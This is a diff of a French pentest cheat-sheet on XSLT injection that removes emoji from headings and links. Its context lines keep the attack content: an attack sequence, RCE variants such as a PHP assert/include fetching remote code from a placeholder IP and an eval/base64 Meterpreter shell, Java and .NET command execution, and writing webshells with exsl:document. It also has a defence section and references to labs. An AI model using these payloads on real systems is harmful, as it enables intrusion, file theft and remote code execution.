@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 📜 XSLT Injection
+# XSLT Injection
 
 > [!info] **En 1 phrase**
 > XSLT Injection = faire exécuter une **feuille de style XSLT contrôlée/non validée** par le processeur
@@ -22,7 +22,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 XSLT (eXtensible Stylesheet Language Transformations) = langage de **transformation XML→XML/HTML/text** :
 le processeur applique une **feuille de style** (`.xsl`/`.xslt`) sur un document XML via des **templates**
@@ -34,13 +34,13 @@ et des **fonctions intégrées** (`system-property`, `document`, `current`…). 
 flowchart LR
     A[Feuille XSLT<br>uploadée / injectée] --> B[Application<br>XSLTProcessor.transform]
     B --> C{XSLT non validée}
-    C --> D["📂 document()<br>lecture fichiers / SSRF"]
-    C --> E["🧨 php:function / java: / msxsl:script<br>RCE"]
-    C --> F["✍️ exsl:document<br>écriture fichiers"]
-    C --> G[📄 DTD + entités<br>XXE]
+    C --> D["document()<br>lecture fichiers / SSRF"]
+    C --> E["php:function / java: / msxsl:script<br>RCE"]
+    C --> F["exsl:document<br>écriture fichiers"]
+    C --> G[DTD + entités<br>XXE]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > L'app utilise un paramètre utilisateur (nom de feuille, contenu uploadé, ou template partiel concaténé)
 > pour construire la transformation sans **validation ni sandbox**. Si on contrôle le XSLT, on contrôle
 > ce que le processeur charge et exécute.
@@ -49,9 +49,9 @@ On la trouve sur les **transformateurs XML→HTML** (reporting, exports, CMS typ
 
 ---
 
-## 🕵️ Détection & identification du processeur
+## Détection & identification du processeur
 
-> [!tip] 💡 **Toujours en premier** : identifier le **processeur et sa version**. Chaque moteur
+> [!tip] **Toujours en premier** : identifier le **processeur et sa version**. Chaque moteur
 > (libxslt, Xalan, Saxon, MSXML/.NET, PHP) a ses extensions et ses capacités — le payload qui marche sur l'un
 > échoue sur l'autre. `system-property()` est le fingerprint universel.
 
@@ -92,7 +92,7 @@ arbitraire → vecteur RCE direct.
 
 ---
 
-## 📂 LFI — Lecture de fichiers
+## LFI — Lecture de fichiers
 
 `document()` accepte des **URIs** : `file://`, chemins absolus, et URLs réseau. Les fonctions d'extension
 PHP/Java complètent en lecture brute.
@@ -141,7 +141,7 @@ Via PHP (`libxslt` + extension `php.net/xsl`) :
 
 ---
 
-## 📡 SSRF & XXE
+## SSRF & XXE
 
 Le **SSRF** est quasi toujours disponible : `document('http://...')` fait une requête côté serveur
 (scan interne, OAST, port-scans par timeouts, lecture des headers de réponse) :
@@ -171,7 +171,7 @@ Le **SSRF** est quasi toujours disponible : `document('http://...')` fait une re
 
 ---
 
-## 💻 RCE — PHP (libxslt / xxsl)
+## RCE — PHP (libxslt / xxsl)
 
 Namespace `xmlns:php="http://php.net/xsl"` → `php:function('nom_fonction', args…)` appelle
 **n'importe quelle fonction PHP** : `system`, `exec`, `passthru`, `shell_exec`, `assert`, `preg_replace`… (`php:functionString` = variante retournant string).
@@ -195,12 +195,12 @@ Namespace `xmlns:php="http://php.net/xsl"` → `php:function('nom_fonction', arg
 </xsl:stylesheet>
 ```
 
-> [!tip] 💡 Variantes classiques : `php:function('assert', 'include("http://IP/test.php")')` (RCE distante)
+> [!tip] Variantes classiques : `php:function('assert', 'include("http://IP/test.php")')` (RCE distante)
 > et `php:function('preg_replace','/.*/e', eval(base64_decode('...Meterpreter...')),'')` → shell PHP complète (cf. agarri).
 
 ---
 
-## ☕ RCE — Java (Xalan / Saxon)
+## RCE — Java (Xalan / Saxon)
 
 ### Xalan — namespace `http://xml.apache.org/xalan/java`
 
@@ -217,7 +217,7 @@ Namespace `xmlns:php="http://php.net/xsl"` → `php:function('nom_fonction', arg
 </xsl:stylesheet>
 ```
 
-> [!tip] 💡 `rt:exec()` ne renvoie pas la sortie : la lire via `Process.getInputStream` → `InputStreamReader`
+> [!tip] `rt:exec()` ne renvoie pas la sortie : la lire via `Process.getInputStream` → `InputStreamReader`
 > → `BufferedReader.readLine` (namespaces `http://xml.apache.org/xalan/java/...`).
 
 ### Saxon — namespace `http://saxon.sf.net/java-type` (XSLT 2.0+)
@@ -236,7 +236,7 @@ Namespace `xmlns:php="http://php.net/xsl"` → `php:function('nom_fonction', arg
 
 ---
 
-## 🪟 RCE — .NET (MSXML / XslCompiledTransform)
+## RCE — .NET (MSXML / XslCompiledTransform)
 
 `msxsl:script` compile du **code arbitraire** (C#, VB, JScript) déclaré dans la feuille :
 
@@ -265,7 +265,7 @@ puis appeler `App:exec('dir C:\\')` dans un `xsl:value-of`.
 
 ---
 
-## ✍️ Écriture de fichiers (EXSLT)
+## Écriture de fichiers (EXSLT)
 
 L'extension `exsl:document` (namespace `http://exslt.org/common`) écrit un fichier sur le disque :
 
@@ -285,12 +285,12 @@ L'extension `exsl:document` (namespace `http://exslt.org/common`) écrit un fich
 **libxslt** expose aussi `http://exslt.org/files` : `file:read`, `file:write`, `file:exists`, `file:list`
 (lecture/écriture ; doublon de `php:function('file_put_contents',...)`).
 
-> [!warning] ⚠️ Écriture = escalade rapide : `.asp`/`.php`/`.aspx` dans le dossier web → **webshell**.
+> [!warning] Écriture = escalade rapide : `.asp`/`.php`/`.aspx` dans le dossier web → **webshell**.
 > Toujours vérifier les droits d'écriture du service (dossier web, `/tmp`, répertoire d'upload).
 
 ---
 
-## 🚧 Bypass de filtres
+## Bypass de filtres
 
 | Filtre | Bypass |
 |---|---|
@@ -308,7 +308,7 @@ Si le processeur **refuse les extensions**, rester en **LFI/SSRF** (`document()`
 
 ---
 
-## 🧰 Outils
+## Outils
 
 ```bash
 # XSLTFuzz (RootUp) — fuzzer / collecte de payloads XSLT
@@ -322,7 +322,7 @@ Source de payloads : **PayloadsAllTheThings**. **Labs** : Root-Me — *XSLT - Co
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -334,16 +334,16 @@ Source de payloads : **PayloadsAllTheThings**. **Labs** : Root-Me — *XSLT - Co
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre d'attaque**
+> [!tip] **Ordre d'attaque**
 > 1. **Identifier le processeur** (`system-property`) → choisir les extensions du bon moteur.
 > 2. **Tester `document()`** (LFI + SSRF) — souvent suffisant pour lire configs/credentials.
 > 3. **Tester XXE** dans la feuille (souvent oublié, très rentable).
 > 4. **RCE** : PHP → `php:function('system','id')` ; Java → `java:Runtime::exec` ; .NET → `msxsl:script`.
 > 5. **Écriture** (`exsl:document` / `file_put_contents`) si les fichiers lisibles ne suffisent pas.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - Les capacités **diffèrent énormément** entre processeurs : un payload `.NET` casse sur libxslt et inversement. D'où l'identification **avant** les payloads.
 > - `document()` échoue sur des fichiers **non-XML** (binaire, encodage) → `unparsed-text` / `php:function('readfile')`.
 > - Le RCE PHP exige l'extension **xxsl** (rarement activée) ; sinon on reste en LFI/SSRF. Même chose côté .NET : `XsltSettings` par défaut bloque `msxsl:script`.
@@ -352,13 +352,13 @@ Source de payloads : **PayloadsAllTheThings**. **Labs** : Root-Me — *XSLT - Co
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XXE|📄 XXE]]
-- [[SSTI|🎨 SSTI]]
-- [[Injection de commandes|🐚 Injection de commandes]]
-- [[SSRF|🌐 SSRF]]
-- [[Upload de fichiers|📤 Upload de fichiers]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)
-- 📚 [From XSLT code execution to Meterpreter shells — Nicolas Grégoire (@agarri)](https://web.archive.org/web/20190820014239/https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
+- [[XXE| XXE]]
+- [[SSTI| SSTI]]
+- [[Injection de commandes| Injection de commandes]]
+- [[SSRF| SSRF]]
+- [[Upload de fichiers| Upload de fichiers]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)
+- [From XSLT code execution to Meterpreter shells — Nicolas Grégoire (@agarri)](https://web.archive.org/web/20190820014239/https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
